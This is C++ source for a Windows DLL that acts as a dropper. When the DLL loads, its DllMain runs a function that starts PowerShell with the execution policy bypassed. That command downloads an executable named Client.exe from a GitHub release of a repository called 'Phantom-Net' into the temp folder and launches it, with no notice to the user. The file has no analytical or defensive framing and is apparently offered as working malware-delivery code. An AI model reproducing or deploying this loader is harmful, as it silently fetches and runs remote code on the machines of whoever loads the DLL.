#include "pch.h"
#include <windows.h>
#include <string>

void ExecutePowerShellScript(const std::wstring& script) {
    std::wstring command = L"powershell -NoProfile -ExecutionPolicy Bypass -Command \"" + script + L"\"";

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcess(
        nullptr,
        &command[0],
        nullptr,
        nullptr,
        FALSE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

extern "C" __declspec(dllexport) void Run() {
    std::wstring githubReleaseUrl = L"https://github.com/ultimate-skid/Phantom-Net/releases/download/1.1/Client.exe";
    std::wstring downloadPath = L"$env:TEMP\\downloaded_file.exe";

    std::wstring script = L"Invoke-WebRequest -Uri '" + githubReleaseUrl +
        L"' -OutFile '" + downloadPath +
        L"'; Start-Process '" + downloadPath + L"'";

    ExecutePowerShellScript(script);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        Run();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
